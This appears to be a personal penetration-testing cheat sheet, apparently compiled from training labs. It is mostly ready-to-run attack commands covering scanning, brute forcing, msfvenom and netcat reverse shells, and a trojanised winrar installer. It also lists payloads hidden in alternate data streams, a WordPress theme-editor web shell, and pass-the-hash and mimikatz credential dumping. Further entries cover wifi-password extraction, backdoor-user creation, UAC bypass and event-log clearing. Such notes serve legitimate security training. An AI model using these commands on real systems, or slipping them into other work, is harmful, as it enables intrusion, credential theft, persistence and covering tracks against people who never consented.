
### [OSINT](#)
- https://academy.hackthebox.com/course/preview/osint-corporate-recon

### [HOST DISCOVERY](#)

**Host Discovery by arp-scan**

- Scan all valid IP addresses on your local networks.
    - `arp-scan -l` / `arp-scan --localnet`
    - `arp-scan -l -I <network interface>` / `arp-scan --localnet --interface=<network interface>`
        - `arp-scan -l -I eth0`
- Scan specific subnet / IP range
    - `arp-scan <subnet>`

**Host Discovery by Netdiscover**
- `sudo netdiscover -r 192.168.204.0/24` 

**Host Discovery by NMAP**

- No Port scan (Ping Sweep, -sn/sP) 
        - -sn can be combined with -p* options

    - When Privileged user uses for local network - ARP request are used
            - `sudo nmap -PR -sn TARGETS` (-PR indicates that you only want an ARP scan)

    - When Privileged user uses for outside local network - {ICMP echo requests, ICMP timestamp requests, TCP SYN (Synchronize) to port 443, TCP ACK (Acknowledge) to port 80 } are used
        - by ARP Scan
            - `sudo nmap -PR -sn TARGETS` (-PR indicates that you only want an ARP scan)
        - by ICMP echo Scan
            - `sudo nmap -PE -sn 10.10.68.220/24` (To use ICMP echo request to discover live hosts, add the option -PE)
        - by ICMP Timestamp 
            - `sudo nmap -PP -sn 10.10.68.220/24`
        - by ICMP Address mask scan
            -  `sudo nmap -PM -sn 10.10.68.220/24`
        - by TCP SYN Scan (SYN ->, <- SYN/ACK, -> RST)
            - `sudo nmap -PS -sn 10.10.68.220/24`
        - by TCP ACK scan (ACK -> and ACK ->, <- RST)
            -  `sudo nmap 192.168.29.0/24 -sn -n -PA`

    - When Unprivileged user uses - 3 way handhsake happens by sending SYN packets
        
        - by TCP SYN Scan (SYN ->, <- SYN/ACK, -> ACK)
            - `nmap -sn 10.10.68.220/24`
            - `nmap -sn 208.109.192.1-255`
            - `nmap -sn 208.109.192.*`
            - `nmap -sP 208.109.*.*`
            - `nmap -sn 208.109.193.* --exclude 208.109.193.5` 
            - `nmap -sn 192.168.46.0/24`


### [PORT & SERVICE SCANNING](#)

- Normal scan
    - `nmap <ip>` / `nmap -p <port> <ip>` / `nmap -p- <ip>` / `nmap --top-ports n <ip>`
- TCP SYN Stealth Scan 
    - `nmap -sS <ip>` , `nmap -sS <subnet>` (SYN Scan)
- No Ping Scan for windows (treat all host online and skip host discovery)
    - `nmap -Pn <ip>` , `nmap -Pn <subnet>`
- NULL Scan (does not even include SYN,ACK)
    - `nmap -sN <ip>`
- Using public dns
    - `nmap --dns-servers 8.8.4.4,8.8.8.8 -sL <ip>`
- UDP Scan
    - `nmap -sU <ip>`

- Service, Verion Scanning
    - Normal service version scan
        - `nmap -sV <ip>` / `nmap -sV -p`

- Tracing newtwork packet
    - `nmap -vv -n -A -T4 -Pn --packet-trace 192.168.29.193`

- Agrssive Scans
    - NMAP
        - `nmap -A -T4 <ip>`
        - `nmap -A -<ip>`

### [ENUMERATING & FOOTPRINTING SERVICES](#)

#### **General Web Recon**

- DNS Enumeration
    - `host`, `dig`, `DNSRecon`(python tool)

- Publically available information
    - `whois`
    - `robots.txt`, `sitemap/xml`
    - `Google Dorks`

- Website techstack enumeration
    - `whatweb`

- Firewall Detection
    - `wafw00f  http://192.49.74.3/webdav/`

- Subdomain Enumeration
    - `sublist3r` (python tool)

- Web Directory Enumeration
    - `nmap 192.245.191.3 --script http-enum`
    - `dirb http://192.245.191.3/ -r`
    - `dirb http://192.102.102.3 /usr/share/metasploit-framework/data/wordlists/directory.txt `
    - `gobuster -u http://10.10.93.218/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt dir `
    - `use auxiliary/scanner/http/brute_dirs` / `use auxiliary/scanner/http/dir_scanner`

#### **HTTP**

- Server Banner and version
    - `use auxiliary/scanner/http/http_version`
    - `curl 192.102.102.3 | more`
    - `browsh --startup-url 192.102.102.3`
    - `lynx http://192.102.102.3`

###### WebDav 
-
    - Http methods supported by /webdav
        - `nmap -p 80 -sV 10.5.17.75 --script http-methods --script-args http-methods.url-path=/webdav/`
    - Webdav scan
        - `nmap -p 80 -sV 10.5.17.75 --script http-webdav-scan --script-args http-methods.url-path=/webdav/`
    - Checking files that can be uploaded
        - `davtest -auth bob:password_123321 -url http://10.5.27.32`

###### Wordpress 

**ENUMERATION**

- /robots.txt
    -  `/robots.txt`- presence of the `/wp-admin` and `/wp-content` will confirm we are dealing with wordpress.`/wp-admin` Typically attempting to browse to the `wp-admin` directory will redirect us to the `wp-login.php`, `wp-content/plugins` This folder is helpful to enumerate vulnerable plugins. `wp-content/themes` These files should be carefully enumerated as they may lead to RCE.

- Inpect Source Code
    - grepping wordpress to confirm its wordpress 
        - `curl -s http://blog.inlanefreight.local | grep WordPress`
    - grepping themes on pages
        - `curl -s http://blog.inlanefreight.local/ | grep themes`
    - grepping plugins on pages
        - `curl -s http://blog.inlanefreight.local | grep plugins `

- Plugins and themes
    - `wpscan --url http://10.10.207.150/blog/ -e vp,u`

- Enumerating Users
    - Observing error on login page `/wp-login.php`. for invalid user and password
    - wpscan - `wpscan --url http://10.10.207.150/blog/ -e vp,u`

**ATTACKS**

- Themes with known vulnerabilities

- Plugins with known vulnerabilities

- Brute Force Login Page
    - `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`
    - `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

- Remote code execution via the theme editor.

- One Way
    - Click on Appearance on the side panel and select Theme Editor. Click on Select after selecting the theme, and we can edit an uncommon page such as `404.php `to add a web shell.
        - Add php Code: `system($_GET[0]);`
    - Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using `cURL.`
        - `curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`




    - Enumerate Plugins and Users on wordpress
        - `wpscan --url http://10.10.207.150/blog/ -e vp,u`
    - Brute Force for any username (in this case admin)
        - `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`

###### Tomcat

**ENUMERATION**

- Discovery/Footprinting
    -  Server header in the HTTP response. 
    - 404, Requesting an invalid page should reveal the server and version.
    -  Another method of detecting a Tomcat server and version is through the /docs page.
        - `curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat `

- General Folder Structure

├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost

#### **SMB**

- SMB version
    - `nmap --script smb-protocols 10.5.16.60 -p 445 `
- SMB security (user/share level suthentication,message signing, challange response,account lockout, password policy)
    - `nmap --script smb-security-mode 10.5.16.60 -p 445 `
    - `nmap --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB active sessions
    - `nmap --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.5.21.157 -p 445`
- SMB network shares
    - `nmap -p445 --script smb-enum-shares 10.5.21.157`
    - `nmap --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB network shares files
    - `nmap --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.31.241`
- SMB users
    - `nmap --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB groups
    - `nmap --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`
- SMB statistics (failed logins. errors etc..)
    - `nmap --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 -p 445 10.5.29.205`

#### **SAMBA**

- Samba enumeration (all possible things)
    - `enum4linux -e 10.10.18.135`

- Samba version, workgroup name, 
    - `nmap 192.213.18.3 -sV -p 445`
    - `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
    - `use auxiliary/scanner/smb/smb_version`
- Samba OS discovery, Netbios name,  computer name
    - `nmap -p 445 192.213.18.3 --script smb-os-discovery`
    - `rpcclient -U "" -N 192.230.148.3` > `srvinfo`
    - `enum4linux -O 192.54.223.3 -p 445`
    - `nmblookup -A 192.221.150.3`
- Samba Anonymous connection
    - `smbclient -L 192.221.150.3`
    - `rpcclient -U "" -N 192.230.148.3`
- Samba accessing shares by connection
    - `smbclient //192.120.159.3/public - N`
    - `smbclient //192.241.81.3/admin -U admin` 
    - `smbclient //192.180.12.3/shawn -U admin` > `?`
- Samaba listing users
    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
    - `use auxiliary/scanner/smb/smb_enumusers`
    - `enum4linux -U 192.54.223.3 -p 445`
    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
- Samba finding SID of admin
    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
- Samba finding domain groups
    - `enum4linux -G  192.120.159.3`
    - `rpcclient -U "" -N 192.120.159.3` > `enumdomgroups`
- Samba listing shares and thrier permissions
    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
    - `smbclient -L 192.221.150.3`
    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
    - `enum4linux -S  192.120.159.3`
    - `use auxiliary/scanner/smb/smb_enumshares`
- Samba listing content of shared drive
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
    - `smbclient //192.120.159.3/public - N` > `ls`
- Samba uploading file to network share
    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
- Samba downloaing file from network share
    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
- Samba remote code execution
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
- Samba pipes available
    - `use auxiliary/scanner/smb/pipe_auditor`
- Samba printer configuration
    - `enum4linux -I  192.120.159.3`



#### **FTP**

- [ ] Version: Check for FTP Version (ProFTPD, VSFTPD etc..) (If it is vulnerable)
    - `nmap 192.60.4.3 -sV -p 21`

- [ ] Anonymous login: Check if FTP Anonymous login is allowed
    - `ftp 192.60.4.3 ` (provide blank password)
    - `nmap 192.176.71.3 -p 21 --script ftp-anon`


#### **SSH**

- OpenSSH version 
    - `nmap 192.238.103.3 -p 22 -sV -O`
    - `nc 192.238.103.3 22`
- Checking if Authentication is required and Type of Authentication supported
    - `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
- Encryption Algorithm for key supported by SSH server
    - `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
- Checking ssh-hostkey ie the public key on server
    - `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`



### [Brute Forcing](#)

#### **Hydra**

- NTLM
    - `hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'` (/ = path to the login page, A=NTLM = NTLM authentication type, F=401 = failure code)

- HTTP
    - `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.5.21.117 http-get /webdav/`
    - `hydra -l admin -P rockyou.txt 127.0.0.1 -s 8080  http-get /login`

- FTP
    - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp`

- SSH
    - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.72.183.3 ssh`

- SMB
    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.241.81.3 smb`

- RDP
    - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.5.31.78 rdp -s 3333`

#### Nmap

- http-brute
    - `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/` / `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/webdav/` / `nmap 192.245.191.3 -p 80 --script http-brute --script-args http-brute.path=/secure/`
- ftp-brute
    - `nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21`
- ssh-brute
    - `nmap 192.72.183.3 -p 22 --script ssh-brute --script-args userdb=/root/user`

#### Crackmapexec

- WinRM
    - `crackmapexec winrm 10.5.16.53 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` 
    - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`

- Pass the hash using crackmapexec
    - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d`

- Remote code Execution using crackmapexec
    - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"`


#### wpscan 

- `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`

#### Metasploit
- 
    - `use auxiliary/scanner/ssh/ssh_login`
    - `use auxiliary/scanner/smb/smb_login`
    - `use auxiliary/scanner/smb/http_login`
    - `use auxiliary/scanner/smb/ftp_login`



### [Payloads, shells and Listeners](#)


#### Reverse shells

##### Publically avalilable

- PhP
    - https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    
    - Some Example vectors
        - Wordpress Theme Editor

- Groovy Reverse  shell
    - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
    
    - Some Example vectors
        - Jenkins Script Console


##### Msfvenom 
- asp
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f asp > shell.asp`

- exe
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe`

- elf
    - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > mybinary`

- exe
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe`

- x86/shikata_ga_nai 
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe > payload.exe`

**Listener**

- Metasploit 
    - Mulit/handler
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `run`

##### Netcat 

- Windows Target
    - Target - `nc.exe 10.0.0.1 1234 -e cmd.exe`
    - Listen - `nc -nlvp 1234`

- Linux Target
    - Target - `nc 10.0.0.1 1234 -e /bin/bash`
    - Listener - `nc -nlvp 1234`

#### Winrm Command shell ruby script
- 
    - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211` 


#### Meterpreter Shell

- Windows Enumeration
    - `sysinfo`, `getuid`, `getpid`, `getprivs`, `ps`, `pgrep <process_name>`, `shell`

- Migrating to other process
    - `ps` > `pgrep <process name>` > `migrate <pid>`

- Checking current privileges
    - `getprivs`

- Windows Privilege Escalation
    - `getsystem`

- Starting shell on system
    - `shell`

- Keylogging
    - `keyscan_start`, `keyscan_dump`

- Adding route to other network for pivoting
    - `run autoroute -s <subnet>/20`

- Portforwarding
    - `portfwd add -l 1234 -p 80 -r 10.5.31.52`

- Hashdumping 
    - Using Mimikatz meterpreter extension
        - `pgrep lsass` > `migrate 788` > `load kiwi` > `creds_all` > `lsa_dump_sam`
    - Using Hashdump
        - `hashdump`

- Create a Backdoor user, enable rdp for it, also hide it from login screen and add it to Remote Desktop Users and Administrators groups
    - `run getgui -e -u user123 -p hacker_123321`

- Clear windows Event Log
    - `clearev`

NOTE - There is more advanced need to be checked from 
https://fuzzysecurity.com/tutorials/16.html, 
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#internet-settings


#### Spawning shell
- Python
    - `python -c 'import pty; pty.spawn("/bin/sh")'`


#### **Injection of payload in executables**

##### Injection of payload in .exe using `msfvenom`
-
    - Injecting payload in winrar.exe
        - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/winrar-x32-624.exe > ~/Downloads/winrar.exe`
        - with actual behaviour
            - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.204.130 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/winrar-x32-624.exe > winrar.exe`

##### Injection of payload in `Resource Stream` of a legitimate file
-
    - copy payload to /temp folder
        - `cd /`  > `mkdir temp ` > `copy c:\Users\Lenovo\Desktop\Payload.exe c:\temp `
    - Using `type` command and hide our payload output into the resource stream of a legitimate file
        - `type Payload.exe > windowslogs.txt:mypayload.exe` 
    - Enter legitimate data in windowslosgs.txt and also delete the payload.exe to stay hidden
        - `notepad windowslogs.txt `
        - `del Payload.exe ` 

### [Payload Transfer Techniques](#)

- Using Netcat
    - We need to have netcat listerner on target machine with `>` so whatever werecieve get stored in `'test.txt`
        - `nc.exe -nlvp 1234 > test.txt`
    - Sned file from your machine
        - `nc -nv 10.5.19.93 1234 < test.txt`
        
- HTTP Server on kali
    - `service apache2 start`
    - `python -m SimpleHTTPServer 80`
    - `python -m http.server 80 `
    - Fetching file
        - `certutil -urlcache -f http://10.10.19.3/payload.exe payload.exe`
        - `wget http://10.17.107.227/exploit.c -P /tmp/`
        - `curl -O http://10.50.138.14/nmap`

- FTP Server on kali
    - `python -m pyftpdlib -p 21`
    - Fetching file
        - `get <filname>`

- SMB Server on kali
    - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .  ` 
    - Fetching file
        - `copy \\10.17.107.227\kali\reverse.exe C:\PrivEsc\reverse.exe`

- Fetching file using Powershell from kali to compromised machine
    - On Kali run http webserver 
        - `sudo python3 -m http.server 80`
    - on compromised machine commandline
        - open powershell from sommandline using command `powershell`
        - on powershell run this to copy sharphound zip file for example
            - `Invoke-WebRequest http://10.50.47.247/SharpHound.exe -OutFile SharpHound.exe`

- SSH File transfer using linux `SCP`(Secure Copy Protocol)
    - Requirement - SSH credentials
        - From Local to Remote (kali to compromised)
            - Syntex
                - `scp [file_name]  remoteuser@remotehost:/remote/directory`
            - example
                - `scp test.txt jayesh@10.143.90.2:/home/jayesh`
            - To Non standard SSH port (when our SSH server is listening on a non-standard port.)
                - Syntex
                    - `scp -P port source_file user@hostname:destination_file`
                - example
                    - `scp -P 2222 test2.txt jayesh@10.143.90.2:/home/jayesh/`
        - From Remote machine to local (compromised to kali)
            - Syntex
                -`scp user@remotehost:/home/user/file_name .`
            - example
                - `scp jayesh@10.143.90.2:/home/jayesh/test1.txt .`
                - `scp sian.gill@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/sian.gill/20240418155122_BloodHound.zip .`
        - From Remote Host to Another Remote Host
            - Syntex
                - `scp user@remotehost:/home/user/file_name user2@remotehost2.com:/remote/directory`


- Uploading via WinRM CLI
    - upload and download
    - `evil-winrm -i '10.200.141.150' -u 'sam' -p 'Cayde@123'` > *Evil-WinRM* PS C:\Users\sam> `mkdir Temp`
        - *Evil-WinRM* PS C:\Users\sam> `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\Users\sam\Temp\mimi.exe`
        - *Evil-WinRM* PS C:\Users\Administrator\Temp> `upload /home/kali/Downloads/chisel C:\Users\Administrator\Temp\chisel.exe`
    - Conversely, we can use download REMOTE_FILEPATH LOCAL_FILEPATH to download files back from the target.

    - Script Loader feature from evil-winrm (-s flag)
        - `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150 -s /usr/share/windows-resources/powersploit/Recon/` > *Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan.ps1`

- Accessing file via RDP from kali with `/drive` option
    - Let’s you share a directory from Attack Machine to Target Machine GUI.
    - Example we share mimikatx directory
        - `xfreerdp /v:10.200.141.150 /u:sam /p:Cayde@123 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz,share`
            - C:\Windows\system32>`\\tsclient\share\x64\mimikatz.exe` 

### [Exploitation](#)



#### Kernel Exploits

- Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) 
    - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`

- Linux Kernel 3.13.0 < 3.19 - 'overlayfs' Local Privilege Escalation 
    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
    
#### HTTP
###### WebDav
- Connectiing to site
    - `curl http://192.245.191.3/webdav/ --user "admin:angels"` / `curl http://192.245.191.3/secure/ --user "admin:brittany"`
- Connecting Webdav
    - `davtest -auth admin:angels -url http://192.245.191.3/webdav/`
    
- Uploading files
    - `curl http://192.49.74.3/webdav/ --user "admin:angels" --upload-file /root/backdoor.asp`
- Downloading files

- Uploading/Downloading/Deleting files to /Webdav
    - `cadaver http://10.5.27.32/webdav`
        - `put /usr/share/webshells/asp/webshell.asp `
        - `delete webshell.asp`

- Uploading files using Metasploit
    - `use exploit/windows/iis/iis_webdav_upload_asp` > `set RHOSTS 10.5.26.116` > `set PATH /webdav/newshell.asp` > `set httpUsername bob` > `set httppassword password_123321` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `exploit`

#### FTP

- FTP connection - `ftp 192.60.4.3 `
- Uploading and Downloading files
    - ftp> `get secret.txt`

#### SSH

- SSH connection 
    - `ssh root@192.238.103.3`
    - `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
    - `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`


#### SAMBA

- Samba listing users
    - `nmap --script smb-enum-users --script-args smbusername=admin,smbpassword=password1 192.157.202.3`
    - `use auxiliary/scanner/smb/smb_enumusers`
    - `enum4linux -U 192.54.223.3 -p 445`
    - `rpcclient -U "" -N 192.54.223.3` >`enumdomusers` 
- Samba accessing shares by connection
    - `smbclient //192.120.159.3/public - N`
    - `smbclient //192.241.81.3/admin -U admin` 
    - `smbclient //192.180.12.3/shawn -U admin` > `?`
- Samba listing shares and thrier permissions
    - `nmap --script smb-enum-shares -script-args smbusername=admin,smbpassword=password1 192.54.233.3`
    - `smbclient -L 192.221.150.3`
    - `smbmap -u guest -p "" -d .  -H 10.5.26.125`
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
    - `enum4linux -S  192.120.159.3`
    - `use auxiliary/scanner/smb/smb_enumshares`
- Samba listing content of shared drive
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`
    - `smbclient //192.120.159.3/public - N` > `ls`
- Samba uploading file to network share
    - `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
- Samba downloaing file from network share
    - `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
- Samba remote code execution
    - `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
- Samba pipes available
    - `use auxiliary/scanner/smb/pipe_auditor`
- Samba finding SID of admin
    - `rpcclient -U "" -N 192.54.223.3` > `lookupnames admin`
    - `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
- Exploiting Using Metasploit
    - `use exploit/linux/samba/is_known_pipename `

#### SMB
###### EternalBlue
- Exploiting `EternalBlue` vulnerabibility in SMBv1
    - `use auxiliary/scanner/smb/smb_ms17_010`

- Exploiting Security misconsifugration *Message signing enabled but not required* by `PSExec`
    - First finding credentials by brute forcing
        - `scanner/smb/smb_login` / `hydra` / any other
    - Exploiting flaw using metasploit `PsExec` module
        - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`

#### RDP

- Connecting RDP
    - `xfreerdp /u:administrator /p:qwertyuiop /v:10.5.31.78:3333`

#### WinRM

- Arbitiary command execution
    - `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "whoami"` / `crackmapexec winrm 10.5.27.211 -u administrator -p tinkerbell -x "systeminfo"`

- Getting Command shell
    - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`
    - `use windows/winrm/winrm_script_exec` > `set RHOSTS 10.5.27.211` > `set RPORT 5985` > `set USERNAME administrator` > `set PASSWORD tinkerbell` > `set FORCE_VBS true` > `exploit`

### [Windows Post Exploitation Enumeration](#)

**Operating System Enumeration**

- OS Name and Version
    - `systeminfo | findstr "OS"`

- System Architecture
    - `echo %PROCESSOR_ARCHITECTURE% `

        - This info is useful for kernel exploits

**Users and Permissions**

- List users and their permissions
    - `net users`
    - `net users <username>`

- Get SIDs
    - `whoami /user`
    - `wmic useraccount get name,sid`

- Get Privileges
    - `whoami /priv`

**Network info enumeration**

- Available network interfaces
    - `ipconfig / all`

- Routing Table
    - `route print`

- ARP (Address Resolution Protocol) cache table for all available interfaces.
    - `arp -A`

- Active network connections 
    - `netstat -ano`

- Firewall rules
    - `netsh firewall show state`
    - `netsh firewall show config` 
        - use `netsh firewall ?`  for more options

- Wifi info

    - List saved Wifi
        - `netsh wlan show profile`

    - To get the clear-text password use
        - `netsh wlan show profile <SSID> key=clear`

    - Oneliner to extract all wifi passwords
        - `cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*`

**Services Enumeration**

- Scheduled Tasks (scheduled bydefult and by task schedular)
    - `schtask`
        - `schtasks /query /fo LIST /v`

- Processes running
    - `tasklist /SVC`

- Started services
    - `net start`
    - `sc query`
        - `sc qc <service_name>`

**Information Enumeration**

- Find files
    - `where /r c:\windows todo.txt`
    - `where /r c:\ flag.txt`
    - `where /r c:\windows ntoskrnl.exe`

- File names containing certain keywords.   
    - `dir /s *pass* == *cred* == *vnc* == *.config*`
    - `findstr /si password *.xml *.ini *.txt`

- Grep the registry for keywords, in this case "password".
    - `reg query HKLM /f password /t REG_SZ /s`
    - `reg query HKCU /f password /t REG_SZ /s`

- Installed Drivers
    - `DRIVERQUERY`
        - `DRIVERQUERY | findstr "<your search>`

- Shares
    - Get a list of computers `net view`
    - Check current shares `net shares`
    - List shares of a computer `net view \\computer /ALL`
    - Mount the share locally `net use x: \\computer\share`

- known computers hardcoded on the hosts file
    - `type C:\Windows\System32\drivers\etc\hosts`

- Currently stored credentials
    - `cmdkey /list`

**DNS Server Enumeration**

- Checking DNS server's used 
    - (miscondifured DNS server may be vulnerble to `DNS Zone Transfer attacks`)
    - `ipconfig /all` 



### [Windows Privilege Escalation](#)

**Privilege Escalation by Kernel Exploits**

- Finding Kernel exploit by using `Exploit Suggestor` on metasploit
    - `search exploit_suggest` > `multi/recon/local_exploit_suggester` > `set SESSION 1` > `exploit`

**Privilege Escalation by Bypassing UAC prompt**

- Checking if user is part of Local Group Administrator
    - `net localgroup administrator`

- Bypassing UAC using metasploit module
    - `use exploit/windows/local/bypassuac_injection ` > `set payload windows/x64/meterpreter/reverse_tcp` > `set SESSION 1` > `set LPORT 1234` >  `set TARGET Windows\ x64 ` > `exploit`
        - This module just disabled UAC, hence we still need to elevate privileges using `getsystem`
        - `getsystem` > `getuid` > `hashdump`

- Bypassing UCA using tool - UACme
    - Creating meterpreter revershe shell Payload and uploading it (in this case uploading using meterpreter session)
        - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.5 LPORT=1234 -f exe > backdoor.exe` 
        - `cd C://` > `mkdir temp` > `cd temp` > `upload backdoor.exe`
    - Uploading the UAC executable `Akagai64.exe`
        - `upload /root/Desktop/tools/UACME/Akagi64.exe`
    - Starting listerner on our machine
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LPORT 1234` > `set LHOST 10.10.19.5` > `run`
    - Executing executable 
        - `.\Akagi64 23 C:\temp\backdoor.exe`

**Privilege Escalation by Windows Access Tokens**
    
- Token Impersonation using Meterpreter Incognito module

    - `load incognito` > `list_tokens -u` > `impersonate_token "ATTACKDEFENSE\Administrator"`
        - In this we impersonate existing token

- Patato attack
    - this attack generates access token for you, instead of impersonating


### [Clearing Tracks](#)

**Clearing artifacts using metasploit `Resource Scripts`**
```
msf6 exploit(windows/local/persistence_service) > `run`
[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vgdjb.exe
[*] Creating service spMjX
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc
[*] Sending stage (175174 bytes) to 10.5.31.225
